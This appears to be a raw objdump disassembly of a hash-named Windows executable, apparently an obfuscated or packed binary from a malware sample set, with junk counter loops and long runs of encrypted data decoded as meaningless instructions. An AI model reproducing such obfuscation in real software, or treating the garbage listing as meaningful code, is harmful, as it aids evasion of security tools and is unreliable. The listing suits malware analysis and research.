
5048f0e8f979d83bb6da82762883c48b052c122b69bfb0f76db11215c16fc0be.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    DWORD PTR ds:0x433717,0x1c
  401013:	cmp    DWORD PTR ds:0x433717,0x0
  40101a:	je     0x40106d
  401020:	cmp    DWORD PTR ds:0x433717,0x6
  401027:	jne    0x401040
  40102d:	push   0x8196
  401032:	push   DWORD PTR [ebp-0xc]
  401035:	push   0x6434
  40103a:	call   DWORD PTR ds:0x412268
  401040:	cmp    DWORD PTR ds:0x433717,0x7
  401047:	jne    0x40105b
  40104d:	xor    eax,eax
  40104f:	xor    eax,DWORD PTR ds:0x433717
  401055:	dec    eax
  401056:	mov    ds:0x433717,eax
  40105b:	mov    eax,ds:0x433717
  401060:	dec    eax
  401061:	mov    ds:0x433717,eax
  401066:	jmp    0x401013
  40106b:	or     ecx,eax
  40106d:	mov    eax,ds:0x413b34
  401072:	mov    DWORD PTR [ebp-0x18],eax
  401075:	sub    DWORD PTR ds:0x43371b,0x1705
  40107f:	mov    eax,ds:0x413c44
  401084:	sub    DWORD PTR ds:0x43371f,edx
  40108a:	mov    DWORD PTR [ebp-0x48],eax
  40108d:	xor    eax,ecx
  40108f:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  401096:	add    eax,DWORD PTR ds:0x433753
  40109c:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  4010a3:	sbb    eax,eax
  4010a5:	mov    eax,DWORD PTR [ebp-0x10]
  4010a8:	push   ebx
  4010a9:	movzx  ebx,BYTE PTR ds:0x43372f
  4010b0:	sbb    ebx,DWORD PTR ds:0x433713
  4010b6:	mov    DWORD PTR ds:0x43372f,ebx
  4010bc:	push   esi
  4010bd:	mov    esi,0x7510854
  4010c2:	xor    eax,esi
  4010c4:	push   edi
  4010c5:	or     ecx,ebx
  4010c7:	mov    edi,0x32729b
  4010cc:	add    eax,edi
  4010ce:	and    DWORD PTR ds:0x4337ab,0x264c
  4010d8:	mov    DWORD PTR [ebp-0x38],eax
  4010db:	mov    DWORD PTR ds:0x43372f,0x18
  4010e5:	cmp    DWORD PTR ds:0x43372f,0x0
  4010ec:	je     0x401146
  4010f2:	cmp    DWORD PTR ds:0x43372f,0xc
  4010f9:	jne    0x401108
  4010ff:	push   DWORD PTR [ebp-0x24]
  401102:	call   DWORD PTR ds:0x4120b4
  401108:	cmp    DWORD PTR ds:0x43372f,0xd
  40110f:	jne    0x401122
  401115:	mov    ebx,DWORD PTR ds:0x43372f
  40111b:	dec    ebx
  40111c:	mov    DWORD PTR ds:0x43372f,ebx
  401122:	xor    ebx,ebx
  401124:	add    ebx,DWORD PTR ds:0x43372f
  40112a:	dec    ebx
  40112b:	mov    DWORD PTR ds:0x43372f,ebx
  401131:	jmp    0x4010e5
  401136:	mov    ecx,DWORD PTR ds:0x4336f7
  40113c:	mov    eax,ds:0x4337b3
  401141:	sub    ecx,eax
  401143:	add    ecx,DWORD PTR [ecx+eax*1]
  401146:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40114d:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401154:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40115b:	or     DWORD PTR ds:0x43379b,0x1296
  401165:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40116c:	mov    eax,DWORD PTR [ebp-0x10]
  40116f:	sub    DWORD PTR ds:0x43367f,0x1011
  401179:	xor    eax,esi
  40117b:	add    eax,edi
  40117d:	mov    DWORD PTR [ebp-0xc],eax
  401180:	sbb    DWORD PTR ds:0x43369f,0x6b1e
  40118a:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401191:	mov    BYTE PTR [ebp-0x11],0x67
  401195:	mov    eax,DWORD PTR [ebp-0x10]
  401198:	xor    DWORD PTR ds:0x4336db,0x46ad
  4011a2:	xor    eax,esi
  4011a4:	add    eax,edi
  4011a6:	jmp    0x401347
  4011ab:	jb     0x401145
  4011ad:	fsub   DWORD PTR [edx]
  4011af:	lock bound esi,QWORD PTR [eax+0x68]
  4011b3:	push   ecx
  4011b4:	in     al,0x70
  4011b6:	or     BYTE PTR [esi],cl
  4011b8:	add    eax,0x7e7e2995
  4011bd:	jle    0x40123d
  4011bf:	cli    
  4011c0:	jg     0x401240
  4011c2:	jle    0x401192
  4011c4:	xlat   BYTE PTR ds:[ebx]
  4011c5:	cmp    eax,0xcfd339d5
  4011ca:	rol    edx,1
  4011cc:	pop    es
  4011cd:	add    al,0x3
  4011cf:	add    bl,bh
  4011d1:	add    BYTE PTR [edi],cl
  4011d3:	xor    ecx,DWORD PTR [edi]
  4011d5:	rcr    BYTE PTR [eax],0xc7
  4011d8:	adc    BYTE PTR [edi],bl
  4011da:	mov    ecx,0xddb70058
  4011df:	push   cs
  4011e0:	out    dx,eax
  4011e1:	mov    ebp,0x8e03d6db
  4011e6:	es mov esi,0x1541a2f4
  4011ec:	lods   eax,DWORD PTR ds:[esi]
  4011ed:	fiadd  WORD PTR [esi+0x1f]
  4011f0:	data16 in al,dx
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	or     edx,DWORD PTR [ecx]
  4011f5:	pushf  
  4011f6:	js     0x4011ce
  4011f8:	inc    eax
  4011f9:	stos   BYTE PTR es:[edi],al
  4011fa:	push   ebx
  4011fb:	sub    eax,0xad3cc4d1
  401200:	mov    bh,BYTE PTR [ebx-0x3b]
  401203:	stos   DWORD PTR es:[edi],eax
  401204:	push   es
  401205:	(bad)  
  401206:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  40120c:	jmp    0x40123e
  40120e:	mov    ebp,ecx
  401210:	dec    edi
  401211:	out    0xa6,al
  401213:	inc    ecx
  401214:	call   DWORD PTR [edi-0x2556f868]
  40121a:	mov    ebp,0x5536ed4d
  40121f:	and    esi,DWORD PTR [edx-0x43619116]
  401225:	jnp    0x401238
  401227:	ret    
  401228:	xchg   edx,eax
  401229:	and    esp,edx
  40122b:	jmp    0x40128b
  40122d:	ret    0xb8e4
  401230:	lock jmp 0xd765:0x74cf3192
  401238:	and    ch,cl
  40123a:	add    bl,cl
  40123c:	adc    DWORD PTR [ecx-0x5a],edx
  40123f:	xor    eax,0x78616f03
  401244:	or     BYTE PTR [ecx],dh
  401246:	fisttp QWORD PTR [esi+0x7f752854]
  40124c:	(bad)
  401251:	or     ebx,DWORD PTR [ebx+0x55]
  401254:	fst    st(6)
  401256:	or     ebx,edx
  401258:	pop    esp
  401259:	fstp   DWORD PTR [ecx]
  40125b:	jno    0x4011fb
  40125d:	inc    esi
  40125e:	dec    ebx
  40125f:	aaa    
  401260:	adc    eax,0x1a29772b
  401265:	sar    DWORD PTR [esi],cl
  401267:	dec    edi
  401268:	call   0x3f16b73a
  40126d:	gs scas al,BYTE PTR es:[edi]
  40126f:	lahf   
  401270:	mov    eax,ds:0xc8102200
  401275:	fistp  DWORD PTR [ebx-0x3aa43794]
  40127b:	jno    0x401294
  40127d:	jnp    0x401243
  40127f:	sbb    ecx,esp
  401281:	xor    bh,al
  401283:	addr16 in eax,0x1f
  401286:	hlt    
  401287:	rcl    DWORD PTR [ecx-0x379d6f63],0x5f
  40128e:	hlt    
  40128f:	out    dx,eax
  401290:	loope  0x4012ce
  401292:	inc    ecx
  401293:	xor    BYTE PTR [edi-0x2c83a8e9],bl
  401299:	ja     0x401267
  40129b:	sbb    DWORD PTR [edi-0x54],esp
  40129e:	jo     0x4012bd
  4012a0:	ins    DWORD PTR es:[edi],dx
  4012a1:	dec    esp
  4012a2:	jae    0x401276
  4012a4:	fild   QWORD PTR [edx-0x79]
  4012a7:	ins    DWORD PTR es:[edi],dx
  4012a8:	popa   
  4012a9:	adc    eax,0xf697dfe8
  4012ae:	xchg   esp,eax
  4012af:	(bad)  
  4012b0:	shr    BYTE PTR [edx+0x499084a3],0x11
  4012b7:	mov    ds,WORD PTR [edi]
  4012b9:	add    DWORD PTR ds:0xe4c22110,0xffffffee
  4012c0:	mov    eax,esi
  4012c2:	in     al,0x55
  4012c4:	es cld 
  4012c6:	in     al,dx
  4012c7:	mov    DWORD PTR [ebp-0x18],eax
  4012ca:	jge    0x4012cd
  4012cc:	mov    ah,0x55
  4012ce:	lods   eax,DWORD PTR ds:[esi]
  4012cf:	push   ebp
  4012d0:	push   ebp
  4012d1:	or     al,0xee
  4012d3:	leave  
  4012d4:	lea    ebx,[edx-0x79308deb]
  4012da:	adc    esi,DWORD PTR [edi]
  4012dc:	loop   0x4012f7
  4012de:	mov    eax,0x3cb7a060
  4012e3:	fidiv  DWORD PTR [esi-0x30]
  4012e6:	fimul  WORD PTR [eax+0x67]
  4012e9:	cli    
  4012ea:	or     BYTE PTR [ecx+0x19],0xf2
  4012ee:	aad    0xd7
  4012f0:	cmp    DWORD PTR [ecx],edi
  4012f2:	outs   dx,DWORD PTR ds:[esi]
  4012f3:	int    0x53
  4012f5:	fist   WORD PTR [eax]
  4012f7:	inc    ebp
  4012f8:	mov    ds:0x2f70ab21,eax
  4012fd:	aad    0x9a
  4012ff:	icebp  
  401300:	pop    ebp
  401301:	lahf   
  401302:	jo     0x401309
  401304:	imul   ebx,DWORD PTR [ebp-0x24],0x42f82d90
  40130b:	xor    BYTE PTR [eax-0x55],cl
  40130e:	pop    eax
  40130f:	ret    0x160d
  401312:	(bad)  
  401313:	out    dx,al
  401314:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401315:	iret   
  401316:	ds out dx,al
  401318:	icebp  
  401319:	sub    edx,ebp
  40131b:	pop    esp
  40131c:	fmul   QWORD PTR [ecx+edx*4+0xbfcd121]
  401323:	out    dx,al
  401324:	xchg   edx,eax
  401325:	push   edi
  401326:	mov    dl,0x21
  401328:	mul    ebp
  40132a:	call   0x807ae54a
  40132f:	loop   0x401327
  401331:	repnz cli 
  401333:	fisub  WORD PTR [ebx+esi*2]
  401336:	call   0xe8593c6b
  40133b:	ins    DWORD PTR es:[edi],dx
  40133c:	call   0xb134d273
  401341:	jge    0x401389
  401343:	imul   eax,DWORD PTR [edi-0x56],0xf445892e
  40134a:	and    DWORD PTR ds:0x4336d3,0x0
  401354:	jmp    0x401366
  401359:	mov    ebx,DWORD PTR ds:0x4336d3
  40135f:	inc    ebx
  401360:	mov    DWORD PTR ds:0x4336d3,ebx
  401366:	cmp    DWORD PTR ds:0x4336d3,0x10
  40136d:	jae    0x401543
  401373:	cmp    DWORD PTR ds:0x4336d3,0x12
  40137a:	jne    0x401393
  401380:	push   0x3bad
  401385:	push   0x706b
  40138a:	push   DWORD PTR [ebp-0x20]
  40138d:	call   DWORD PTR ds:0x412284
  401393:	jmp    0x401359
  401398:	or     DWORD PTR ds:0x43368b,0x43367f
  4013a2:	jmp    0x401543
  4013a7:	dec    ebp
  4013a8:	push   0xb1638b43
  4013ad:	push   ebp
  4013ae:	push   0xd91cd24
  4013b3:	fist   DWORD PTR [esi+0x7ffa68d5]
  4013b9:	jle    0x401439
  4013bb:	cli    
  4013bc:	jg     0x40143c
  4013be:	jle    0x4013d5
  4013c0:	leave  
  4013c1:	xchg   edx,eax
  4013c2:	mov    ebp,0x450202aa
  4013c7:	jae    0x401353
  4013c9:	ret    
  4013ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013cb:	pop    edx
  4013cc:	pusha  
  4013cd:	and    BYTE PTR [ecx+0x60221b70],cl
  4013d3:	and    eax,0x651c167b
  4013d8:	adc    al,0xc6
  4013da:	sub    DWORD PTR [ecx-0x6400a9d5],ebp
  4013e0:	sar    DWORD PTR [ebp+0x6fed7282],1
  4013e6:	popa   
  4013e7:	jb     0x401465
  4013e9:	push   ebp
  4013ea:	mov    cl,0x13
  4013ec:	inc    eax
  4013ed:	scas   eax,DWORD PTR es:[edi]
  4013ee:	rol    DWORD PTR [edi-0x58],0x4e
  4013f2:	fstp   TBYTE PTR [ebp+esi*8-0x67]
  4013f6:	lsl    edi,WORD PTR [ebx]
  4013f9:	inc    ecx
  4013fa:	or     DWORD PTR [esi],edx
  4013fc:	xlat   BYTE PTR ds:[ebx]
  4013fd:	xor    dh,BYTE PTR [edi-0x6d]
  401400:	xchg   ecx,eax
  401401:	mov    ebx,0x1334e22d
  401406:	(bad)  
  401407:	icebp  
  401408:	test   BYTE PTR [eax+0x3d],dh
  40140b:	in     eax,0xbc
  40140d:	pop    esp
  40140e:	xor    BYTE PTR [esi],al
  401410:	into   
  401411:	(bad)  [edi]
  401413:	sbb    DWORD PTR [eax-0x39],ecx
  401416:	push   esp
  401417:	rcr    BYTE PTR [edi+0x680fbfda],1
  40141d:	(bad)  
  40141e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40141f:	push   ebp
  401420:	retf   
  401421:	or     bh,cl
  401423:	call   0xcb:0xe363ab37
  40142a:	xchg   ecx,eax
  40142b:	push   0xffffffbe
  40142d:	jge    0x4013bc
  40142f:	pop    esp
  401430:	std    
  401431:	cmp    BYTE PTR [ebx+0x540fe4bc],ah
  401437:	out    0x75,eax
  401439:	cmp    al,0xcb
  40143b:	add    DWORD PTR [ebp-0x7743cfb1],ebp
  401441:	ins    BYTE PTR es:[edi],dx
  401442:	xchg   ebp,eax
  401443:	sub    BYTE PTR [edi+ebp*1-0x2],0x4a
  401448:	pop    ebp
  401449:	pop    esp
  40144a:	retf   0x320a
  40144d:	in     eax,0xeb
  40144f:	add    DWORD PTR [esi],edi
  401451:	repz sub BYTE PTR [edx+0x3b6691a2],bh
  401458:	retf   
  401459:	lds    edx,FWORD PTR [edx+ebp*2-0x16]
  40145d:	(bad)  
  40145e:	js     0x401408
  401460:	pop    ds
  401461:	(bad)  
  401462:	scas   al,BYTE PTR es:[edi]
  401463:	sub    eax,0x559e8ae9
  401468:	pushf  
  401469:	ins    BYTE PTR es:[edi],dx
  40146a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40146b:	push   edx
  40146c:	scas   al,BYTE PTR es:[edi]
  40146d:	xor    al,0xb9
  40146f:	jmp    0x1c1ff48a
  401474:	xchg   edx,eax
  401475:	fisubr DWORD PTR [ebx+0x3a]
  401478:	enter  0xeaef,0xba
  40147c:	inc    esp
  40147d:	lods   al,BYTE PTR ds:[esi]
  40147e:	xchg   dl,cl
  401480:	and    edi,esi
  401482:	pop    esi
  401483:	sti    
  401484:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401485:	or     esi,esp
  401487:	sub    ah,BYTE PTR ds:0x414b3202
  40148d:	arpl   di,cx
  40148f:	adc    eax,eax
  401491:	outs   dx,BYTE PTR ds:[esi]
  401492:	enter  0xeb7c,0x2d
  401496:	lods   al,BYTE PTR ds:[esi]
  401497:	inc    eax
  401498:	outs   dx,BYTE PTR es:[esi]
  40149a:	cmp    eax,0x4ceaed57
  40149f:	jecxz  0x4014a1
  4014a1:	sub    al,BYTE PTR [eax]
  4014a3:	mov    ah,0xfd
  4014a5:	scas   eax,DWORD PTR es:[edi]
  4014a6:	mov    dl,BYTE PTR [esi]
  4014a8:	push   ds
  4014a9:	out    dx,al
  4014aa:	mov    dh,0x92
  4014ac:	lods   al,BYTE PTR ds:[esi]
  4014ad:	out    dx,al
  4014ae:	inc    ecx
  4014af:	cmp    cl,BYTE PTR [ebx+0xc]
  4014b2:	and    ch,BYTE PTR [ebx]
  4014b4:	js     0x401469
  4014b6:	test   DWORD PTR [ecx+esi*1-0x6e73896c],eax
  4014bd:	xchg   BYTE PTR [ecx],ah
  4014bf:	jae    0x401457
  4014c1:	nop
  4014c2:	inc    esi
  4014c3:	xor    edx,DWORD PTR [ebp+0x1]
  4014c6:	adc    ah,BYTE PTR [ecx]
  4014c8:	push   esi
  4014c9:	pushf  
  4014ca:	xor    edx,DWORD PTR [esi]
  4014cc:	inc    edi
  4014cd:	push   esp
  4014ce:	mov    edi,0xa20eddc2
  4014d3:	sub    ch,bl
  4014d5:	push   eax
  4014d6:	(bad)  
  4014d7:	mov    bh,0xc3
  4014d9:	push   esp
  4014da:	jl     0x40147d
  4014dc:	add    al,0x5f
  4014de:	xchg   ecx,eax
  4014df:	sbb    cl,ch
  4014e1:	jnp    0x4014f0
  4014e3:	xor    BYTE PTR [edi],al
  4014e5:	mov    ecx,0x7560855d
  4014ea:	sub    eax,0x948046fc
  4014ef:	mov    edx,esp
  4014f1:	mov    ds:0xed72c97,ax
  4014f7:	out    dx,eax
  4014f8:	in     al,0x37
  4014fa:	jecxz  0x40150d
  4014fc:	leave  
  4014fd:	out    dx,eax
  4014fe:	shl    ecx,0xce
  401501:	bound  edx,QWORD PTR [ecx+edi*4+0x76634a7e]
  401508:	pop    ds
  401509:	mov    esp,0xe157fa2d
  40150e:	mov    edi,0xb2724d8f
  401513:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  401515:	cmp    DWORD PTR [ecx+0x67],edx
  401518:	add    DWORD PTR [edi+ecx*4],ebx
  40151b:	(bad)  
  40151c:	lahf   
  40151d:	fs clc 
  40151f:	push   esp
  401520:	mov    ax,ds:0x9f766837
  401526:	mov    ecx,0xd6fbbe8e
  40152b:	repz pop ds
  40152d:	push   edi
  40152e:	ficomp DWORD PTR [ecx+0x115b97ba]
  401534:	ins    BYTE PTR es:[edi],dx
  401535:	dec    esi
  401536:	div    ah
  401538:	mov    dh,al
  40153a:	jnp    0x401543
  40153c:	pop    es
  40153d:	sbb    al,0xb6
  40153f:	push   edx
  401540:	dec    esp
  401541:	in     al,dx
  401542:	or     BYTE PTR [ebx+0x1d31c445],0x8f
  401549:	ss inc ebx
  40154b:	add    BYTE PTR [ebx],dh
  40154d:	(bad)  
  40154e:	neg    ecx
  401550:	jmp    0x4016f1
  401555:	cli    
  401556:	fcomp  QWORD PTR [edx-0x4caea7e9]
  40155c:	jno    0x4014f6
  40155e:	cmp    ah,BYTE PTR [ebx-0x2109d91d]
  401564:	mov    al,0x6
  401566:	jge    0x4015e6
  401568:	jle    0x401564
  40156a:	jg     0x4015ea
  40156c:	jle    0x401516
  40156e:	mov    esi,ecx
  401570:	aam    0x2
  401572:	clc    
  401573:	icebp  
  401574:	cmp    eax,0xc4f656ac
  401579:	push   0xffffff88
  40157b:	fs inc eax
  40157d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40157e:	in     al,dx
  40157f:	imul   ebx,esi,0x1708cde8
  401585:	sbb    eax,0x3766900f
  40158a:	sub    eax,DWORD PTR [ecx]
  40158c:	push   ss
  40158d:	ret    
  40158e:	gs mov eax,fs
  401591:	push   ds
  401592:	bound  esi,QWORD PTR [eax+0x77]
  401595:	repnz mov esp,0x5e92c7b4
  40159b:	mov    dl,0x7
  40159d:	cli    
  40159e:	and    ch,BYTE PTR [edi+0x5c]
  4015a1:	add    al,0x38
  4015a3:	push   edx
  4015a4:	add    ecx,esp
  4015a6:	jnp    0x401578
  4015a8:	sub    eax,0x3df4b2a4
  4015ad:	mov    ss,esi
  4015af:	in     al,0xe7
  4015b1:	jmp    0x764d:0x23c6edc7
  4015b8:	ss pop edi
  4015ba:	cmc    
  4015bb:	aam    0x81
  4015bd:	mov    bh,0xfb
  4015bf:	dec    ebx
  4015c0:	fdivr  st(6),st
  4015c2:	jge    0x4015fd
  4015c4:	sbb    ch,cl
  4015c6:	fld    QWORD PTR ss:0xd91cce16
  4015cd:	(bad)  
  4015cf:	sub    eax,0x8f2e8bcc
  4015d4:	outs   dx,BYTE PTR ds:[esi]
  4015d5:	and    al,0x2c
  4015d7:	mov    dl,0x96
  4015d9:	inc    eax
  4015da:	sbb    eax,0x37b73e4
  4015df:	lods   al,BYTE PTR ds:[esi]
  4015e0:	add    DWORD PTR [esi+0x22],ecx
  4015e3:	mov    cl,0x50
  4015e5:	cmc    
  4015e6:	jg     0x4015e4
  4015e8:	xor    eax,0x7f698e05
  4015ed:	pop    ecx
  4015ee:	inc    ebx
  4015ef:	loopne 0x401583
  4015f1:	test   eax,0x2182865a
  4015f6:	mov    edi,ebx
  4015f8:	lods   al,BYTE PTR ds:[esi]
  4015f9:	inc    edx
  4015fa:	retf   0xd397
  4015fd:	sbb    edi,DWORD PTR [eax+0x30]
  401600:	cmp    esp,DWORD PTR [ebx-0x3b]
  401603:	add    DWORD PTR [ebx+0x42d41b87],0x8db9e5f7
  40160d:	jbe    0x401662
  40160f:	xchg   ebx,eax
  401610:	push   0x1f36c5df
  401615:	ins    DWORD PTR es:[edi],dx
  401616:	jae    0x401623
  401618:	jmp    FWORD PTR [edi+0x49d9880d]
  40161e:	push   ebx
  40161f:	and    DWORD PTR [edi+0x75b142a7],edi
  401625:	sahf   
  401626:	jno    0x40167b
  401628:	fild   QWORD PTR [esi-0x12]
  40162b:	or     al,0x59
  40162d:	xchg   ecx,eax
  40162e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40162f:	cmp    al,bh
  401631:	xchg   bh,bh
  401633:	dec    ebx
  401634:	ss test al,0xc
  401637:	ret    
  401638:	aas    
  401639:	cdq    
  40163a:	cmp    DWORD PTR ds:0x13ad7ed4,edx
  401640:	cdq    
  401641:	fidiv  DWORD PTR [ecx+0x3b]
  401644:	dec    edx
  401645:	out    dx,al
  401646:	stos   DWORD PTR es:[edi],eax
  401647:	cmp    al,0x65
  401649:	repnz dec eax
  40164b:	pop    ecx
  40164c:	outs   dx,DWORD PTR ds:[esi]
  40164d:	jmp    DWORD PTR [ebx+eax*4+0x4c956d5c]
  401654:	sbb    BYTE PTR [eax+0x25],al
  401657:	adc    al,0xf6
  401659:	push   ds
  40165a:	stos   BYTE PTR es:[edi],al
  40165b:	repnz mov bh,0xd7
  40165e:	inc    edi
  40165f:	push   esp
  401660:	mul    edi
  401662:	mov    dh,0xb0
  401664:	pop    esi
  401665:	pop    ss
  401666:	mov    ebp,0x80e0fd00
  40166b:	jo     0x40161f
  40166d:	aaa    
  40166e:	ja     0x4016e5
  401670:	and    eax,0xa5521a14
  401675:	mov    gs,WORD PTR [edi]
  401677:	scas   eax,DWORD PTR es:[edi]
  401678:	push   ebp
  401679:	sbb    DWORD PTR [ecx+0x8],edi
  40167c:	in     eax,dx
  40167d:	outs   dx,BYTE PTR ds:[esi]
  40167e:	loop   0x4016da
  401680:	push   edx
  401681:	mov    ebx,0x9dc01621
  401686:	xchg   ecx,eax
  401687:	push   edx
  401688:	dec    ecx
  401689:	les    ecx,FWORD PTR [eax+0x408d1f88]
  40168f:	and    DWORD PTR [ebp+0x10],ecx
  401692:	jo     0x4016ec
  401694:	fdivr  st(7),st
  401696:	fadd   st(6),st
  401698:	ins    BYTE PTR es:[edi],dx
  401699:	mov    al,ds:0xa2980655
  40169e:	and    esi,DWORD PTR [ebp-0xa]
  4016a1:	imul   esi,DWORD PTR [ecx-0x14],0x77
  4016a5:	or     BYTE PTR [esi-0x66],ah
  4016a8:	sub    BYTE PTR [edi-0xd],0xfd
  4016ac:	xchg   ebp,eax
  4016ad:	push   ds
  4016ae:	test   BYTE PTR [edi],bh
  4016b0:	mov    ah,0x6b
  4016b2:	sbb    BYTE PTR [ebx+eiz*1],al
  4016b5:	dec    edx
  4016b6:	jmp    0xce14e819
  4016bb:	int    0xcc
  4016bd:	mov    al,ds:0xe9c84baa
  4016c2:	jecxz  0x40168e
  4016c4:	xor    eax,DWORD PTR [edi]
  4016c6:	loope  0x40173f
  4016c8:	mov    edi,0xcd1394e4
  4016cd:	sub    eax,DWORD PTR [eax+eiz*4-0x43030d14]
  4016d4:	add    al,0xb9
  4016d6:	push   ds
  4016d7:	cmp    bl,dh
  4016d9:	bound  eax,QWORD PTR [esi+0x1c]
  4016dc:	add    eax,0x9c69de35
  4016e1:	and    al,BYTE PTR [edx+esi*2-0x23d6b5aa]
  4016e8:	or     ch,bl
  4016ea:	add    DWORD PTR [ecx],0x52934d47
  4016f0:	mov    bh,0x3
  4016f2:	(bad)  
  4016f3:	mov    DWORD PTR [ebp-0x34],eax
  4016f6:	mov    eax,DWORD PTR [ebp-0x44]
  4016f9:	xor    eax,esi
  4016fb:	sbb    ecx,ecx
  4016fd:	add    eax,edi
  4016ff:	mov    DWORD PTR [ebp-0x30],eax
  401702:	mov    eax,DWORD PTR [ebp-0x28]
  401705:	and    DWORD PTR ds:0x43375f,0x0
  40170f:	jmp    0x401721
  401714:	mov    ebx,DWORD PTR ds:0x43375f
  40171a:	inc    ebx
  40171b:	mov    DWORD PTR ds:0x43375f,ebx
  401721:	cmp    DWORD PTR ds:0x43375f,0x18
  401728:	jae    0x40176c
  40172e:	cmp    DWORD PTR ds:0x43375f,0xa
  401735:	jne    0x40174b
  40173b:	push   0x7b82
  401740:	push   0x1a57
  401745:	call   DWORD PTR ds:0x41226c
  40174b:	cmp    DWORD PTR ds:0x43375f,0x9
  401752:	jne    0x401767
  401758:	xor    ebx,ebx
  40175a:	xor    ebx,DWORD PTR ds:0x43375f
  401760:	inc    ebx
  401761:	mov    DWORD PTR ds:0x43375f,ebx
  401767:	jmp    0x401714
  40176c:	xor    eax,esi
  40176e:	sbb    DWORD PTR ds:0x433683,0x47a9
  401778:	add    eax,edi
  40177a:	dec    DWORD PTR ds:0x433697
  401780:	mov    DWORD PTR [ebp-0x2c],eax
  401783:	lea    eax,[ebp-0x98]
  401789:	mov    DWORD PTR [ebp-0x8],eax
  40178c:	movzx  ecx,WORD PTR ds:0x43368b
  401793:	and    ecx,DWORD PTR ds:0x4336db
  401799:	mov    DWORD PTR ds:0x43368b,ecx
  40179f:	mov    eax,DWORD PTR [ebp-0x10]
  4017a2:	mov    DWORD PTR [ebp-0x24],eax
  4017a5:	and    DWORD PTR ds:0x4337af,0x0
  4017af:	jmp    0x4017c3
  4017b4:	xor    ebx,ebx
  4017b6:	or     ebx,DWORD PTR ds:0x4337af
  4017bc:	inc    ebx
  4017bd:	mov    DWORD PTR ds:0x4337af,ebx
  4017c3:	cmp    DWORD PTR ds:0x4337af,0x1c
  4017ca:	jae    0x40184e
  4017d0:	cmp    DWORD PTR ds:0x4337af,0x11
  4017d7:	jne    0x4017f0
  4017dd:	push   DWORD PTR [ebp-0x14]
  4017e0:	push   0x35e4
  4017e5:	push   0x7b35
  4017ea:	call   DWORD PTR ds:0x412270
  4017f0:	cmp    DWORD PTR ds:0x4337af,0x10
  4017f7:	jne    0x40180a
  4017fd:	mov    ebx,DWORD PTR ds:0x4337af
  401803:	inc    ebx
  401804:	mov    DWORD PTR ds:0x4337af,ebx
  40180a:	jmp    0x4017b4
  40180f:	and    DWORD PTR ds:0x433763,0x0
  401819:	mov    eax,ds:0x433763
  40181e:	inc    eax
  40181f:	mov    ds:0x433763,eax
  401824:	cmp    DWORD PTR ds:0x433763,0x27
  40182b:	jne    0x401841
  401831:	push   0x1cc5
  401836:	push   0x4336a3
  40183b:	call   DWORD PTR ds:0x412338
  401841:	cmp    DWORD PTR ds:0x433763,0x1d
  401848:	jb     0x401819
  40184e:	mov    eax,DWORD PTR [ebp-0x1c]
  401851:	xor    ebx,DWORD PTR ds:0x43379f
  401857:	mov    DWORD PTR [ebp-0x20],eax
  40185a:	and    DWORD PTR ds:0x4337ab,0x0
  401864:	jmp    0x401878
  401869:	xor    ecx,ecx
  40186b:	xor    ecx,DWORD PTR ds:0x4337ab
  401871:	inc    ecx
  401872:	mov    DWORD PTR ds:0x4337ab,ecx
  401878:	cmp    DWORD PTR ds:0x4337ab,0x12
  40187f:	jae    0x4018d1
  401885:	cmp    DWORD PTR ds:0x4337ab,0x4
  40188c:	jne    0x4018b2
  401892:	push   0x6e91
  401897:	push   DWORD PTR [ebp-0x10]
  40189a:	push   DWORD PTR [ebp-0x24]
  40189d:	push   0x5930
  4018a2:	push   0x63f1
  4018a7:	push   0x153a
  4018ac:	call   DWORD PTR ds:0x412274
  4018b2:	cmp    DWORD PTR ds:0x4337ab,0x3
  4018b9:	jne    0x4018cc
  4018bf:	mov    ecx,DWORD PTR ds:0x4337ab
  4018c5:	inc    ecx
  4018c6:	mov    DWORD PTR ds:0x4337ab,ecx
  4018cc:	jmp    0x401869
  4018d1:	mov    ebx,0xf89c853d
  4018d6:	jmp    0x401a77
  4018db:	or     ecx,esi
  4018dd:	out    0x8,al
  4018df:	jecxz  0x401911
  4018e1:	icebp  
  4018e2:	int    0x17
  4018e4:	add    eax,0x3e316ade
  4018e9:	fs cmc 
  4018eb:	cmp    BYTE PTR [edx+0x7e],0x7e
  4018ef:	cli    
  4018f0:	jg     0x401970
  4018f2:	jle    0x401936
  4018f4:	jg     0x401909
  4018f6:	dec    esp
  4018f7:	mov    eax,ds:0x404f11e8
  4018fc:	or     BYTE PTR [ecx+0x370c3f70],0xcc
  401903:	cmp    eax,0xb449ae11
  401908:	cwde   
  401909:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40190a:	sub    eax,0x8aab43f6
  40190f:	mov    eax,ds:0x46f3b667
  401914:	loop   0x401917
  401916:	mov    eax,DWORD PTR [ecx+0x3702c772]
  40191c:	jb     0x401936
  40191e:	sub    ecx,edi
  401920:	add    ch,BYTE PTR [ebp-0x4f79745e]
  401926:	scas   al,BYTE PTR es:[edi]
  401927:	sub    eax,esp
  401929:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40192a:	ror    BYTE PTR [esp+eax*8],0xc9
  40192e:	leave  
  40192f:	sbb    BYTE PTR [eax-0x4e],dh
  401932:	add    eax,0x5b8db341
  401937:	or     edx,DWORD PTR [ebx+0x3e]
  40193a:	out    0xc7,al
  40193c:	pop    ebx
  40193d:	sub    al,0x8a
  40193f:	pop    edx
  401940:	test   BYTE PTR [esi+edi*1+0x5],0xc7
  401945:	xor    eax,0xbf8ea05b
  40194a:	loopne 0x4019ab
  40194c:	(bad)  
  40194d:	in     al,0xd8
